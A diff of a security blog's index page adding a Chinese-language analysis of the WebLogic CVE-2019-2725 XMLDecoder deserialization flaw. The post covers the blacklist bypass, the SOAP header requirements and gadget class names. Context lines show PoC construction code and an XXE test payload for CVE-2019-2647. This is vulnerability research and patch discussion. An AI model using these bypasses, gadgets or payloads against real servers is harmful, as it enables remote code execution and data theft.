@@ -334,6 +334,190 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2019/04/30/CVE-2019-2725分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2019/04/30/CVE-2019-2725分析/" itemprop="url">
+                  CVE-2019-2725 分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-30T19:03:53+08:00">
+                2019-04-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/04/30/CVE-2019-2725分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/04/30/CVE-2019-2725分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/04/30/CVE-2019-2725分析/" class="leancloud_visitors" data-flag-title="CVE-2019-2725 分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>这个漏洞最先由某厂商报给某银行，某银行再将该信息报给CNVD，后CNVD通告：国家信息安全漏洞共享平台（CNVD）收录了由中国民生银行股份有限公司报送的Oracle WebLogic wls9-async反序列化远程命令执行漏洞（CNVD-C-2019-48814），详情见链接：<a href="http://www.cnvd.org.cn/webinfo/show/4989" target="_blank" rel="external">cnvd</a><br>对于该漏洞，Oracle官方也破例了一回，提前发了<a href="https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html?from=timeline" target="_blank" rel="external">补丁</a>，但是这个补丁只是针对10.3.6系列的，对于12版本系列还未披露补丁。所以还是请各位谨慎对待，勒索大军跃跃欲试。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>某天接到工程线同事反馈的时候，说wls9-async存在远程代码执行漏洞，可能跟xmldecoder相关，因为一年前分析过该漏洞，详情<a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/"><br>Weblogic XMLDecoder RCE分析</a>：当时第一直觉判断不应该是这个地方再出问题，查了一下相关接口，怀疑是SOAPInvokeState.getClonedSOAPMessage<br>的问题，后来进一步分析把这个地方排除了。一天后另一个同事给了一个非常模糊的poc，也看不到利用链。隐隐约约看到class，void，这就确定了是xmldecoder的问题，于是聚焦于xmldecoder的补丁。仔细一对比WorkContextXmlInputAdapter的validate接口，还真是能被绕过。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</div><div class="line">      WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</div><div class="line"></div><div class="line">      <span class="keyword">try</span> &#123;</div><div class="line">         SAXParser parser = factory.newSAXParser();</div><div class="line">         parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</div><div class="line">            <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</div><div class="line"></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</div><div class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</div><div class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</div><div class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</div><div class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</div><div class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</div><div class="line">               &#125; <span class="keyword">else</span> &#123;</div><div class="line">                  <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</div><div class="line">                     <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</div><div class="line">                        <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</div><div class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</div><div class="line">                        &#125;</div><div class="line">                     &#125;</div><div class="line">                  &#125;</div><div class="line"></div><div class="line">                  <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</div><div class="line">                     String var9 = attributes.getValue(<span class="string">"class"</span>);</div><div class="line">                     <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</div><div class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</div><div class="line">                     &#125;</div></pre></td></tr></table></figure></p>
+<p>核心问题在判断void标签和array标签的时候不是遇到这两个标签就抛出异常，而是做了一个for循环遍历，当属性为空的就不会进这个遍历循环，也就不会抛出异常，当然就能直接绕过。像网上一大堆使用类似<code>&lt;void class=&quot;xxx&quot;&gt;</code>的假poc，假分析文章的时候，就感觉安全圈还真是个娱乐圈。此处笑脸。虽然能过了这个验证环节，但还是需要结合xml的知识来完成完整利用，比如父类，比如Soap定义等等。这也就是有些开发人员更容易构造出绕过的PoC。<br>知道了漏洞点，构造出PoC还是有挺多拦路虎的，我这里简单列列。</p>
+<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>使用<code>-Dweblogic.webservice.verbose=* -Dweblogic.wsee.verbose=*</code><br>第一步打开调试开关。<br>weblogic 处理SOAP的方式：<br><img src="/images/cve-2019-2725-1.gif" alt="1.gif"></p>
+<p>有了这个SOAP请求处理框架图和日志，在发送测试请求的时候就能看出整个处理流程。部分日志如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">|  &lt;WSEE&gt;/_async/AsyncResponseService  |</div><div class="line">  --------------------------------------</div><div class="line">&lt;WSEE:23&gt;Created&lt;SoapMessageContext.&lt;init&gt;:48&gt;</div><div class="line">&lt;WSEE:23&gt;Processing MessageContextInitHandler...  &lt;HandlerIterator.handleRequest:131&gt;</div><div class="line">&lt;WSEE:23&gt;Processing ConnectionHandler...  &lt;HandlerIterator.handleRequest:131&gt;</div><div class="line">     ** S T A R T   R E Q U E S T **</div><div class="line">&lt;WSEE:23&gt;HTTP REQUEST</div><div class="line">  POST /_async/AsyncResponseService</div><div class="line">............................</div><div class="line">&lt;WSEE:23&gt; from Header, got serverName=&apos;AdminServer&apos;&lt;ForwardingHandler.handleRequest:321&gt;</div><div class="line">&lt;WSEE:23&gt;from LocalServerIdentity.getIdentity() got serverName=&apos;AdminServer&apos;&lt;ForwardingHandler.handleRequest:338&gt;</div><div class="line">&lt;WSEE:23&gt;Processing SoapFaultHandler...  &lt;HandlerIterator.handleRequest:131&gt;</div><div class="line">&lt;WSEE:23&gt;Processing AsyncResponseWsrmWsscHandler...  &lt;HandlerIterator.handleRequest:131&gt;</div><div class="line">&lt;WSEE:23&gt;AsyncResponseWsrmWsscHandler.handleRequest&lt;AsyncResponseWsrmWsscHandler.handleRequest:82&gt;</div><div class="line">&lt;WSEE:23&gt;Processing InterceptionHandler...  &lt;HandlerIterator.handleRequest:131&gt;</div><div class="line">&lt;WSEE:23&gt;Processing VersionRedirectHandler...  &lt;HandlerIterator.handleRequest:131&gt;</div><div class="line"></div><div class="line">...................</div></pre></td></tr></table></figure></p>
+<p>从上述日志就可以看出，所有的请求都会经过webservice注册的21个Handler来处理，我们把断点下在HandlerIterator.handleRequest，就能截取每一个handler。这种通用的责任链模式在web容器中还是很普遍的。具体的handler如下：<br><img src="/images/cve-2019-2725-2.png" alt="2.png"></p>
+<h3 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h3><p>第一步，针对于这个_async入口，我们把重点放在AsyncResponseHandler上，通过其handleRequest的代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">handleRequest</span><span class="params">(MessageContext var1)</span> </span>&#123;   </div><div class="line"><span class="keyword">if</span> (var1 == <span class="keyword">null</span>) &#123;        <span class="keyword">return</span> <span class="keyword">true</span>;    &#125; </div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!(var1 <span class="keyword">instanceof</span> SOAPMessageContext)) &#123;        <span class="keyword">return</span> <span class="keyword">true</span>;    &#125; </div><div class="line"><span class="keyword">else</span> &#123;        <span class="keyword">if</span> (verbose) &#123;            Verbose.log(<span class="string">"AsyncResponseHandler.handleRequest"</span>);        &#125;       </div><div class="line">String var2 = (String)var1.getProperty(<span class="string">"weblogic.wsee.addressing.RelatesTo"</span>);        <span class="keyword">if</span> (var2 == <span class="keyword">null</span>) &#123;    </div><div class="line"><span class="keyword">return</span> <span class="keyword">false</span>;        &#125; <span class="keyword">else</span> &#123;</div></pre></td></tr></table></figure></p>
+<p>可以看出来必须设置RelatesTo属性，不然就直接返回了，不会进入后面反序列化的流程了。<br>根据 soap ws.addressing的定义<a href="https://www.w3.org/Submission/ws-addressing/" target="_blank" rel="external">ws<br>-address</a>，其格式为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">wsa:MessageID</span>&gt;</span> xs:anyURI <span class="tag">&lt;/<span class="name">wsa:MessageID</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">wsa:RelatesTo</span> <span class="attr">RelationshipType</span>=<span class="string">"..."</span>?&gt;</span>xs:anyURI<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">wsa:To</span>&gt;</span>xs:anyURI<span class="tag">&lt;/<span class="name">wsa:To</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xs:anyURI<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">wsa:From</span>&gt;</span>endpoint-reference<span class="tag">&lt;/<span class="name">wsa:From</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">wsa:ReplyTo</span>&gt;</span>endpoint-reference<span class="tag">&lt;/<span class="name">wsa:ReplyTo</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">wsa:FaultTo</span>&gt;</span>endpoint-reference<span class="tag">&lt;/<span class="name">wsa:FaultTo</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>所以poc中的第一步就是要加上ws-address的相关字段。</p>
+<p>第二步就是在处理这个xml的过程中，必须删除多余的空格和换行，这是由于xmldecoder处理string标签的差异导致的。根据<a href="http://www.docjar.com/docs/api/com/sun/beans/decoder/StringElementHandler.html" target="_blank" rel="external">StringElementHandler</a>的提示，可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;string&gt;description&lt;/string&gt;is equivalent to &#123;@code &quot;description&quot;&#125; in Java code. The value of inner element is calculated before adding to the string using String#valueOf(Object) . Note that all characters are used including whitespaces (&apos; &apos;, &apos;\t&apos;, &apos;\n&apos;, &apos;\r&apos;). So the value of the element</div><div class="line">&lt;string&gt;&lt;true&gt;&lt;/string&gt; is not equal to the value of the element</div><div class="line">&lt;string&gt;</div><div class="line">    &lt;true&gt;</div><div class="line">&lt;/string&gt;</div></pre></td></tr></table></figure></p>
+<p>也就是说紧凑和不紧凑是有本质区别的。不紧凑的话获取的内容是带换行和空格，这是我当时调试的时候死活找不到类的原因，坑了我不少时间。</p>
+<p>第三步，过了前面那个坑就是找相应的payload去执行了，我给oracle提交了<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>，无视jdk版本限制,目前公开的还有<code>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</code>，这个类就是利用二次反序列化，二次反序列找的对象可包括<br>org.springframework.transaction.support.AbstractPlatformTransactionManager<br>，详情可见我以前的 <a href="http://xxlegend.com/2018/10/23/Weblogic%20CVE-2018-3191%E5%88%86%E6%9E%90/">分析文档</a>，二次反序列还可以包括jdk7u21，rmi等等gadget，其实第一层的入口也还有挺多类，鉴于这个漏洞的严重性和急迫性，这里不做详细阐述，所以在添加规则的时候一定不能依据利用类来添加规则，说不定明天就被绕过了。下面在ProcessBuilder上下一个断点，调用栈如下：<br><img src="/images/cve-2019-2725-3.png" alt="3.png"><br><img src="/images/cve-2019-2725-4.png" alt="4.png"></p>
+<p>这个漏洞以前跟过，这里就不再详细阐述。详细跟踪过程参考以前的<a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/">分析文档</a></p>
+<h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><p>新的补丁将class加入了黑名单<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"class"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:class"</span>);</div></pre></td></tr></table></figure></p>
+<p> 这种方式对于漏洞研究人员来说还是挺好玩的。<br> 详细的补丁如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</div><div class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      SAXParser parser = factory.newSAXParser();</div><div class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</div><div class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</div><div class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</div><div class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"class"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:class"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</div><div class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; attributes.getLength(); ++i) &#123;</div><div class="line">                     <span class="keyword">if</span> (!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(i))) &#123;</div><div class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(i));</div><div class="line">                     &#125;</div><div class="line">                  &#125;</div><div class="line">               &#125;</div><div class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</div><div class="line">                  String attClass = attributes.getValue(<span class="string">"class"</span>);</div><div class="line">                  <span class="keyword">if</span> (attClass != <span class="keyword">null</span> &amp;&amp; !attClass.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</div><div class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</div><div class="line">                  &#125;</div><div class="line">                  String lengthString = attributes.getValue(<span class="string">"length"</span>);</div><div class="line">                  <span class="keyword">if</span> (lengthString != <span class="keyword">null</span>) &#123;</div><div class="line">                     <span class="keyword">try</span> &#123;</div><div class="line">                        <span class="keyword">int</span> length = Integer.valueOf(lengthString);</div><div class="line">                        <span class="keyword">if</span> (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123;</div><div class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed array length limitation"</span>);</div><div class="line">                        &#125;</div><div class="line">                        <span class="keyword">this</span>.overallarraylength += length;</div><div class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;</div><div class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed over all array limitation."</span>);</div><div class="line">                        &#125;</div><div class="line">                     &#125; <span class="keyword">catch</span> (NumberFormatException var8) &#123;</div></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2019/04/19/weblogic CVE-2019-2647等相关XXE漏洞分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -459,7 +643,7 @@
 <p>稍微懂点xxe漏洞的人都知道这是xxe的防护代码，这个文件新加到了ForeignRecoveryContext.java和WSATXAResource.java中，就拿<br>ForeignRecoveryContext来入手。其修复后的代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</div><div class="line">      klassVersion = in.readInt();</div><div class="line">      <span class="keyword">this</span>.fxid = (Xid)in.readObject();</div><div class="line">      <span class="keyword">this</span>.debug(<span class="string">"ForeignRecoveryContext.readExternal tid:"</span> + <span class="keyword">this</span>.fxid);</div><div class="line">      <span class="keyword">this</span>.version = (Version)in.readObject();</div><div class="line">      <span class="keyword">int</span> len = in.readInt();</div><div class="line">      <span class="keyword">byte</span>[] eprBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[len];</div><div class="line">      in.readFully(eprBytes);</div><div class="line">      <span class="keyword">this</span>.epr = EndpointReference.readFrom(WSATStreamHelper.convert(<span class="keyword">new</span> ByteArrayInputStream(eprBytes)));</div><div class="line">      <span class="keyword">this</span>.debug(<span class="string">"ForeignRecoveryContext.readExternal EndpointReference:"</span> + <span class="keyword">this</span>.epr);</div><div class="line">      ForeignRecoveryContextManager.getInstance().add(<span class="keyword">this</span>);</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
 <p>仔细对比下来就是EndpointReference.readFrom(WSATStreamHelper.convert(new ByteArrayInputStream(eprBytes)));WSATStreamHelper.convert是新加的，从前面代码中也可以看到在convert的过程中启用了xxe防护。再一看这个函数还是readExternal，这不就是典型的反序列化漏洞的入口吗？看官看到这就知道payload怎么来了，最典型的就是通过T3协议，如下就是如何构造PoC了。</p>
 <h1 id="PoC构造"><a href="#PoC构造" class="headerlink" title="PoC构造"></a>PoC构造</h1><p>构造PoC还是有些弯路的，最典型的就是为什么拿ForeignRecoveryContext.java入手，其实看官可以尝试些其他漏洞点，构造的时候会遇到一些问题，有些问题不好一时解决所以就转到ForeignRecoveryContext.java。言归正传，详细的构造如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyEndpointReference</span> <span class="keyword">extends</span> <span class="title">EndpointReference</span></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">writeTo</span><span class="params">(Result result)</span></span>&#123;</div><div class="line">        <span class="keyword">byte</span>[] tmpbytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</div><div class="line">        <span class="keyword">int</span> nRead;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            InputStream is = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"test.xml"</span>));</div><div class="line">            </div><div class="line">            <span class="keyword">while</span>((nRead=is.read(tmpbytes,<span class="number">0</span>,tmpbytes.length)) != -<span class="number">1</span>)&#123;</div><div class="line">                ((StreamResult)result).getOutputStream().write(tmpbytes,<span class="number">0</span>,nRead);</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getXXEObject</span><span class="params">(String command)</span> </span>&#123;</div><div class="line"><span class="keyword">int</span> klassVersion = <span class="number">1032</span>;</div><div class="line">Xid xid = <span class="keyword">new</span> weblogic.transaction.internal.XidImpl();</div><div class="line">Version v = Version.DEFAULT;</div><div class="line"><span class="keyword">byte</span>[] tid = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">65</span>&#125;;</div><div class="line"></div><div class="line">weblogic.wsee.wstx.internal.ForeignRecoveryContext frc = <span class="keyword">new</span> weblogic.wsee.wstx.internal.ForeignRecoveryContext();</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">Field f = frc.getClass().getDeclaredField(<span class="string">"fxid"</span>);</div><div class="line">f.setAccessible(<span class="keyword">true</span>);</div><div class="line">f.set(frc,xid);</div><div class="line">Field f1 = frc.getClass().getDeclaredField(<span class="string">"epr"</span>);</div><div class="line">f1.setAccessible(<span class="keyword">true</span>);</div><div class="line">f1.set(frc,(EndpointReference)<span class="keyword">new</span> MyEndpointReference());</div><div class="line">Field f2 = frc.getClass().getDeclaredField(<span class="string">"version"</span>);</div><div class="line">f2.setAccessible(<span class="keyword">true</span>);</div><div class="line">f2.set(frc,v);</div><div class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">e.printStackTrace();</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> frc;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>test.xml的内容可以是任意的xxe的payload：比如说如下，<br>xxe，测试payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE data SYSTEM "http://xxlegend.com/weblogic" [</span></div><div class="line">        &lt;!ELEMENT data (#PCDATA)&gt;</div><div class="line">        ]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>test.xml的内容可以是任意的xxe的payload：比如说如下，<br>xxe，测试payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data SYSTEM "http://xxlegend.com/weblogic" [</span></div><div class="line">        &lt;!ELEMENT data (#PCDATA)&gt;</div><div class="line">        ]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>关键点都展示完了，秀一下成果。</p>
